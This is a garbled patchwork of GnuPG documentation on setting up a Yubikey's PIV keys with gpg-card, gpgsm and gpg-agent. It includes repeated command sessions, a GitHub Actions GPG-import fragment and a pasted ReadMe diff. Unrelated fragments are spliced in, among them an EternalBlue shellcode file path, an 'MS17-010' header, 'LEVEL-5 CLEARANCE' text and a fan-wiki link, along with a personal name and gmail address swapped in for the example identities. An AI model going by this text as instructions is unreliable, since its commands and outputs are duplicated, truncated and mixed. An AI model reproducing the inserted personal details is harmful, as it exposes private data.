++gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB ++gpg/card> writecert PIV.9D < encr.crt ++ ++jobs: ++ import-gpg: ++ runs-on: ubuntu-latest ++ steps: ++ - ++ name: Checkout ++ uses: actions/checkout@v4 ++ - ++ name: Import GPG key ++ uses: crazy-max/ghaction-import-gpg@v6 ++ with: ++ gpg_private_key: {{ secrets.PASSPHRASE }} ++ fingerprint: "C17D11ADF199F12A30A0910F1F80449BE0B08CB8" ++ - ++ name: List keys ++ run: gpg -K ++ ++pub ed25519 2021-09-24 [C] ++ 87F257B89CE462100BEC0FFE6071D218380FDCC8 ++ Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092 ++uid [ unknown] Joe Bar joe@bar.foo ++sub ed25519 2021-09-24 [S] ++ C17D11ADF199F12A30A0910F1F80449BE0B08CB8 ++ Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB ++name: import-gpg ++/.gnupg/scdaemon.conf and by restarting scdaemon, either by killing the process or by using gpgconf --kill scdaemon. Finally the default order in which card applications are tried by scdaemon can be changed. For example to prefer PIV over OpenPGP it is sufficient to add ++ ++application-priority piv ++to ~/.gnupg/scdaemon.conf and to restart scdaemon. This has an effect only on tokens which support both, PIV and OpenPGP, but does not hamper the use of OpenPGP only tokens. ++ ++With one of these methods employed the list command of gpg-card shows this: ++ ++gpg/card> list ++Reader ...........: 1050:0407:X:0 ++Card type ........: yubikey ++Card firmware ....: 5.1.2 ++Serial number ....: FF020001008A77C1 ++Application type .: PIV ++Version ..........: 1.0 ++Displayed s/n ....: yk-9074625 ++PIN usage policy .: app-pin ++PIN retry counter : - 3 - ++PIV authentication: [none] ++ keyref .....: PIV.9A ++Card authenticat. : [none] ++ keyref .....: PIV.9E ++Digital signature : [none] ++ keyref .....: PIV.9C ++Key management ...: [none] ++ keyref .....: PIV.9D ++34798AAFE0A7565088101CC4AE31C5C8C74461CB.key ++list --cards ++well. The PIV authentication key (internal reference PIV.9A ++Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) is used for encryption ++ ++gpg/card> auth 010203040506070801020304050607080102030405060708 ++gpg/card> auth < myauth.key ++ ++gpg/card> generate --algo=nistp384 PIV.9A ++PIV card no. yk-9074625 detected ++gpg/card> generate --algo=nistp256 PIV.9E ++PIV card no. yk-9074625 detected ++gpg/card> generate --algo=rsa2048 PIV.9C ++PIV card no. yk-9074625 detected ++ ‘--force’ ++gpg/card> list ++Reader ...........: 1050:0407:X:0 ++Card type ........: yubikey ++Card firmware ....: 5.1.2 ++Serial number ....: FF020001008A77C1 ++Application type .: PIV ++Version ..........: 1.0 ++Displayed s/n ....: yk-9074625 ++PIN usage policy .: app-pin ++PIN retry counter : - 3 - ++PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E ++ keyref .....: PIV.9A (auth) ++ algorithm ..: nistp384 ++Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C ++ keyref .....: PIV.9E (auth) ++ algorithm ..: nistp256 ++Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED ++ keyref .....: PIV.9C (sign,cert) ++ algorithm ..: rsa2048 ++Key management ...: [none] ++ keyref .....: PIV.9D ++keygrip ++gpg ++self-signed X.509 certificate (exit the gpg-card tool, first): ++ ++$ gpgsm --gen-key -o encr.crt ++ (1) RSA ++ (2) Existing key ++ (3) Existing key from card ++Your selection? 1 ++What keysize do you want? (3072) 2048 ++Requested keysize is 2048 bits ++Possible actions for a RSA key: ++ (1) sign, encrypt ++ (2) sign ++ (3) encrypt ++Your selection? 3 ++Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE ++Enter email addresses (end with an empty line): ++> otto@example.net ++> ++Enter DNS names (optional; end with an empty line): ++> ++Enter URIs (optional; end with an empty line): ++> ++Create self-signed certificate? (y/N) y ++These parameters are used: ++ Key-Type: RSA ++ Key-Length: 2048 ++ Key-Usage: encrypt ++ Serial: random ++ Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE ++ Name-Email: otto@example.net ++ ++Proceed with creation? (y/N) ++Now creating self-signed certificate. This may take a while ... ++gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB ++gpgsm: certificate created ++Ready. ++$ gpgsm --import encr.crt ++gpgsm: certificate imported ++gpgsm: total number processed: 1 ++gpgsm: imported: 1 ++gpg/card> list ++Reader ...........: 1050:0407:X:0 ++Card type ........: yubikey ++Card firmware ....: 5.1.2 ++Serial number ....: FF020001008A77C1 ++Application type .: PIV ++Version ..........: 1.0 ++Displayed s/n ....: yk-9074625 ++PIN usage policy .: app-pin ++PIN retry counter : - 3 - ++PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E ++ keyref .....: PIV.9A (auth) ++ algorithm ..: nistp384 ++Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C ++ keyref .....: PIV.9E (auth) ++ algorithm ..: nistp256 ++Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED ++ keyref .....: PIV.9C (sign,cert) ++ algorithm ..: rsa2048 ++Key management ...: [none] ++ keyref .....: PIV.9D ++keygrip ++gpgsm --gen-key -o encr.crt ++ (1) RSA ++ (2) Existing key ++ (3) Existing key from card ++Your selection? 1 ++What keysize do you want? (3072) 2048 ++Requested keysize is 2048 bits ++Possible actions for a RSA key: ++ (1) sign, encrypt ++ (2) sign ++ (3) encrypt ++Your selection? 3 ++Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE ++Enter email addresses (end with an empty line): ++> otto@example.net ++> ++Enter DNS names (optional; end with an empty line): ++> ++Enter URIs (optional; end with an empty line): ++> ++Create self-signed certificate? (y/N) y ++These parameters are used: ++ Key-Type: RSA ++ Key-Length: 2048 ++ Key-Usage: encrypt ++ Serial: random ++ Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE ++ Name-Email: otto@example.net ++ ++Proceed with creation? (y/N) ++Now creating self-signed certificate. This may take a while ... ++gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB ++gpgsm: certificate created ++Ready. ++$ gpgsm --import encr.crt ++gpgsm: certificate imported ++gpgsm: total number processed: 1 ++gpgsm: imported: 1 ++ ++gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB ++gpg/card> writecert PIV.9D < encr.crt ++ ++gpgsm --with-keygrip -k 6309304695z@gmail.com ++Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB ++ keyref .....: PIV.9D (encr) ++ algorithm ..: rsa2048 ++ used for ...: X.509 ++ user id ..: CN=Encryption key for yk-9074625,O=example,C=DE ++ user id ..: 6309304695z@gmail.com ++ ++34798AAFE0A7565088101CC4AE31C5C8C74461CB.key ++ ++$ gpgsm --learn ++$ gpgsm --gen-key -o sign.crt ++Please select what kind of key you want: ++ (1) RSA ++ (2) Existing key ++ (3) Existing key from card ++Your selection? 3 ++Serial number of the card: FF020001008A77C1 ++Available keys: ++ (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 ++ (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 ++ (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 ++ (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 ++Your selection? 3 ++Possible actions for a RSA key: ++ (1) sign, encrypt ++ (2) sign ++ (3) encrypt ++Your selection? 2 ++Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE ++Enter email addresses (end with an empty line): ++> 6309304695z@gmail.com ++> ++Enter DNS names (optional; end with an empty line): ++> ++Enter URIs (optional; end with an empty line): ++> ++Create self-signed certificate? (y/N) ++These parameters are used: ++ Key-Type: card:PIV.9C ++ Key-Length: 1024 ++ Key-Usage: sign ++ Serial: random ++ Name-DN: CN=Signing key for yk-9074625,O=example,C=DE ++ Name-Email: 6309304695z@gmail.com ++ ++Proceed with creation? (y/N) y ++Now creating self-signed certificate. This may take a while ... ++gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED ++gpgsm: certificate created ++Ready. ++$ gpgsm --import sign.crt ++gpgsm: certificate imported ++gpgsm: total number processed: 1 ++gpgsm: imported: 1 ++ ++‘gpgsm --learn’ ++Digital signature’ key ++gpg-card:010203040506070801020304050607080102030405060708 ++ ++shellcode/eternalblue_sc_merge.py ++ ++gpg/card> writecert PIV.9C < sign.crt

on:
push:
branches: master
+AUTHENTICATE [--setkey] [--raw] [< file]|key] +AUTH and set key + +GENERATE [--force] [--algo=algo{+algo2}] keyref +Create a new key on a card. Use --force to overwrite an existing key. Use "help" for algo to get a list of known algorithms. For OpenPGP cards several algos may be given. Note that the OpenPGP key generation is done interactively unless --algo or keyref + +LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] ¶ +L + +READCERT [--openpgp] certref > file ¶ + +openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3" + +WRITECERT certref < file ¶ +WRITECERT --openpgp certref [< file|fpr] +WRITECERT --clear certref +Write a certificate to the card under the id certref. + +WRITEKEY [--force] keyref keygrip ¶ +Write a private key object identified by keygrip to the card under the id keyref. Option --force allows overwriting an existing key +—Shadowed + +YUBIKEY cmd args ¶ +Various commands pertaining to Yubikey tokens with cmd being: + +LIST +List supported and enabled Yubikey applications. + +ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] +DISABLE +Enable or disable the specified or all applications on the given interface. + +Authentication key +This is a 24 byte key described by the hex string +010203040506070801020304050607080102030405060708. + +PIV + +Authentication key +This is a 24 byte key described by the hex string +010203040506070801020304050607080102030405060708 + +the string gpg/card> is the prompt + +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: D2760001240102010006090746250000 +Application type .: OpenPGP +Version ..........: 2.1 +[...] + +use help yubikey). + +use help yubikey) + +gpg/card> yubikey disable all opgp +gpg/card> yubikey list +Application USB NFC +----------------------- +OTP yes yes +U2F yes yes +OPGP no no +PIV yes no +OATH yes yes +FIDO2 yes yes +gpg/card> reset + +/.gnupg/scdaemon.conf + +application-priority piv + +scdaemon + +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: [none]

 keyref .....: PIV.9A
+Card authenticat. : [none]

 keyref .....: PIV.9E
+Digital signature : [none]

 keyref .....: PIV.9C
+Key management ...: [none]

 keyref .....: PIV.9D
+In + +Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) + +Card authentication key; however, that key is mandatory by the PIV standard and thus we create it too. Key generation requires that we authenticate to the card. This can be done either on the command line (which would reveal the key): + +gpg/card> auth 010203040506070801020304050607080102030405060708 + +gpg/card> auth < myauth.key + +gpg/card> generate --algo=nistp384 PIV.9A +PIV card no. yk-9074625 detected +gpg/card> generate --algo=nistp256 PIV.9E +PIV card no. yk-9074625 detected +gpg/card> generate --algo=rsa2048 PIV.9C +PIV card no. yk-9074625 detected + +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E

 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
+Key management ...: [none]

 keyref .....: PIV.9D 
+—force + +$ gpgsm --gen-key -o encr.crt

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 1 +What keysize do you want? (3072) 2048 +Requested keysize is 2048 bits +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 3 +Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> otto@example.net +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) y +These parameters are used:
Key-Type: RSA
Key-Length: 2048
Key-Usage: encrypt
Serial: random
Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
Name-Email: otto@example.net
+Proceed with creation? (y/N) +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpgsm: certificate created +Ready. +$ gpgsm --import encr.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 + +gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpg/card> writecert PIV.9D < encr.crt + +[...] +Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB

 keyref .....: PIV.9D  (encr)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
   user id ..: <otto@example.net>
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key from the directory ~/.gnupg/private-keys-v1.d/ + +$ gpgsm --learn +$ gpgsm --gen-key -o sign.crt +Please select what kind of key you want:

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 3 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 +Your selection? 3 +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 2 +Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> otto@example.net +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) +These parameters are used:
Key-Type: card:PIV.9C
Key-Length: 1024
Key-Usage: sign
Serial: random
Name-DN: CN=Signing key for yk-9074625,O=example,C=DE
Name-Email: otto@example.net
+Proceed with creation? (y/N) y +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED +gpgsm: certificate created +Ready. +$ gpgsm --import sign.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 + +gpg/card> writecert PIV.9C < sign.crt + +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - [verified] - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E

 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Signing key for yk-9074625,O=example,C=DE
   user id ..: <otto@example.net>
+Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB

 keyref .....: PIV.9D  (encr)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
   user id ..: <otto@example.net>
+PIV authentication’ key with ssh: + +$ ssh-add -l +384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA) + +$ gpgsm --learn +$ gpg --full-gen-key +Please select what kind of key you want:

(1) RSA and RSA (default)
(2) DSA and Elgamal
(3) DSA (sign only)
(4) RSA (sign only)
(14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) +Your selection? 3 +Please specify how long the key should be valid.
    0 = key does not expire
 <n>  = key expires in n days
 <n>w = key expires in n weeks
 <n>m = key expires in n months
 <n>y = key expires in n years
+Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y + +GnuPG needs to construct a user ID to identify your key. + +Real name: +Email address: otto@example.net +Comment: +You selected this USER-ID:

"otto@example.net"
+Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o +gpg: key C3AFA9ED971BB365 marked as ultimately trusted +gpg: revocation certificate stored as '[...]D971BB365.rev' +public and secret key created and signed. + +Note that this key cannot be used for encryption. You may want to use +the command "--edit-key" to generate a subkey for this purpose. +pub rsa2048 2019-04-04 [SC]

 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
+uid otto@example.net +$ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 +Secret key is available. + +sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04  expires: never       usage: SC
card-no: FF020001008A77C1
trust: ultimate      validity: ultimate
+[ultimate] (1). otto@example.net +gpg> addkey +Secret parts of primary key are stored on-card. +Please select what kind of key you want:

(3) DSA (sign only)
(4) RSA (sign only)
(5) Elgamal (encrypt only)
(6) RSA (encrypt only)
(14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) +Your selection? 4 +Please specify how long the key should be valid.
    0 = key does not expire
 <n>  = key expires in n days
 <n>w = key expires in n weeks
 <n>m = key expires in n months
 <n>y = key expires in n years
+Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y +Really create? (y/N) y + +sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04  expires: never       usage: SC
card-no: FF020001008A77C1
trust: ultimate      validity: ultimate
+ssb rsa2048/7067860A98FCE6E1

created: 2019-04-04  expires: never       usage: E
card-no: FF020001008A77C1
+[ultimate] (1). otto@example.net + +gpg> save +Now you can use your PIV card also with gpg. +

diff --git a/ReadMe.md b/ReadMe.md index 7278f80..41b298d 100644 --- a/ReadMe.md +++ b/ReadMe.md @@ -709,7 +709,844 @@ Digital signature’ key gpg-card:

gpg/card> writecert PIV.9C < sign.crt +# MS17-010 +# 000006 +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - [verified] - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E

 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Signing key for yk-9074625,O=example,C=DE
   user id ..: <6309304695z@gmail.co
m> +Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
 keyref .....: PIV.9D  (encr)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
   user id ..: <6309304695z@gmail.com>
PIV authentication’ key with ssh:
+$ ssh-add -l +384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA) +ssh-add with the uppercase ‘-L +$ gpgsm --learn +$ gpg --full-gen-key +Please select what kind of key you want:

(1) RSA and RSA (default)
(2) DSA and Elgamal
(3) DSA (sign only)
(4) RSA (sign only)
(14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) +Your selection? 3 +Please specify how long the key should be valid.
    0 = key does not expire
 <n>  = key expires in n days
 <n>w = key expires in n weeks
 <n>m = key expires in n months
 <n>y = key expires in n years
+Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y + +GnuPG needs to construct a user ID to identify your key. + +Real name: keith bieszczat +Email address: 6309304695z@gmail.com +Comment: https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator +You selected this USER-ID:

"6309304695z@gmail.com"
+Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o +gpg: key C3AFA9ED971BB365 marked as ultimately trusted +gpg: revocation certificate stored as '[...]D971BB365.rev' +public and secret key created and signed. + +Note that this key cannot be used for encryption. You may want to use +the command "--edit-key" to generate a subkey for this purpose. +pub rsa2048 2019-04-04 [SC]

 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
+uid 6309304695z@gmail.com +

run gpg in --expert mode
$ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 +Secret key is available.
+sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04  expires: never       usage: SC
card-no: FF020001008A77C1
trust: ultimate      validity: ultimate
+[ultimate] (1). otto@example.net +gpg> addkey +Secret parts of primary key are stored on-card. +Please select what kind of key you want:

(3) DSA (sign only)
(4) RSA (sign only)
(5) Elgamal (encrypt only)
(6) RSA (encrypt only)
(14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) +Your selection? 4 +Please specify how long the key should be valid.
    0 = key does not expire
 <n>  = key expires in n days
 <n>w = key expires in n weeks
 <n>m = key expires in n months
 <n>y = key expires in n years
+Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y +Really create? (y/N) y + +sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04  expires: never       usage: SC
card-no: FF020001008A77C1
trust: ultimate      validity: ultimate
+ssb rsa2048/7067860A98FCE6E1

created: 2019-04-04  expires: never       usage: E
card-no: FF020001008A77C1
+[ultimate] (1). otto@example.net + +gpg> save + +/* 32A19-D90712
+LEVEL-5 CLEARANCE ONLY

‘--force’ +authentication key +-header-'010203040506070801020304050607080102030405060708' +SETDATA hexstring +to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command
PKSIGN keyid +where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like:
PKSIGN --hash=algoname keyid +READKEY hexified_certid +READCERT hexified_certid|keyid +SERIALNO +Return the serial number of the card using a status response like:
S SERIALNO D27600000000000000000000
WRITEKEY [--force] keyid +SETDATA hexstring +to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command
PKDECRYPT keyid +CHECKPIN idstr +RESTART +APDU [--atr] [--more] [--exlen[=n]] [hexstring] +S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
+./configure --sysconfdir=/etc --localstatedir=/va +CN=Wurzel ZS 3,O=Intevation GmbH,C=DE

A6935DD34EF3087973C706FC311AA2CCF733765B S
CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE

DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S
CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE

!14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S
  # Key added on: 2011-07-20 20:38:46
  # Fingerprint:  5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81
  34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm
+private-keys-v1.d/ +gpg-connect-agent 'help COMMAND' /bye +SETKEY +Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available. +

PKDECRYPT +The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text.
S: INQUIRE CIPHERTEXT
C: D (xxxxxx
C: D xxxx)
C: END +Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure:
(enc-val
  (<algo>
    (<param_name1> <mpi>)
...
    (<param_namen> <mpi>)))
+Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency. + +If the decryption was successful the decrypted data is returned by means of "D" lines. + +Here is an example session: +

C: PKDECRYPT
S: INQUIRE CIPHERTEXT
C: D (enc-val elg (a 349324324)
C: D (b 3F444677CA)))
C: END
S: # session key follows
S: S PADDING 0
S: D (value 1234567890ABCDEF0)
S: OK decryption successful +The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has +SIGKEY +This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay.
SETHASH --hash=| +sig-val
  (<algo>
    (<param_name1> <mpi>)
...
    (<param_namen> <mpi>)))
+The operation is affected by the option +

OPTION use-cache-for-signing=0|1 +The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching.
+Here is an example session: +

C: SIGKEY
S: OK key available
C: SIGKEY
S: OK key available
C: PKSIGN
S: # I did ask the user whether he really wants to sign
S: # I did ask the user for the passphrase
S: INQUIRE HASHVAL
C: D ABCDEF012345678901234
C: END
S: # signature follows
S: D (sig-val rsa (s 45435453654612121212))
S: OK
GENKEY [--no-protection] [--preset] [<cache_nonce>] +Invokes the key generation process and the server will then inquire on the generation parameters, like:
S: INQUIRE KEYPARM
C: D (genkey (rsa (nbits 1024)))
C: END +The format of the key parameters which depends on the algorithm is of the form:
(genkey
 (algo
   (parameter_name_1 ....)
     ....
   (parameter_name_n ....)))
+If everything succeeds, the server returns the public key in a SPKI like S-Expression like this: +

(public-key
  (rsa
(n )
(e ))) +Here is an example session:
C: GENKEY
S: INQUIRE KEYPARM
C: D (genkey (rsa (nbits 1024)))
C: END
S: D (public-key
S: D (rsa (n 326487324683264) (e 10001)))
S OK key created
ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81> +LISTTRUSTED +GpgAgent returns a list of trusted keys line by line:
S: D 000000001234454556565656677878AF2F1ECCFF P
S: D 340387563485634856435645634856438576457A P
S: D FEDC6532453745367FD83474357495743757435D S
S: OK +The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future. +Ok +Finally a client should be able to mark a key as trusted:
MARKTRUSTED fingerprint "P"|"S" +The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this:
S: INQUIRE TRUSTDESC
C: D Do you trust the key with the fingerprint @FPR@
C: D bla fasel blurb.
C: END
S: OK +GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]] \
            [--qualitybar] cache_id                \
            [error_message prompt description]
+PRESET_PASSPHRASE [--inquire] <string_or_keygrip> [] + +HAVEKEY keygrips

GET_CONFIRMATION description
LEARN [--send] +UPDATESTARTUPTTY +SETDATA hexstring
PKSIGN keyid
PKSIGN --hash=algoname keyid
+READCERT hexified_certid|keyid +READKEY hexified_certid +SETDATA hexstring +d +

PKSIGN keyid
LEARN
PKSIGN --hash=algoname keyid
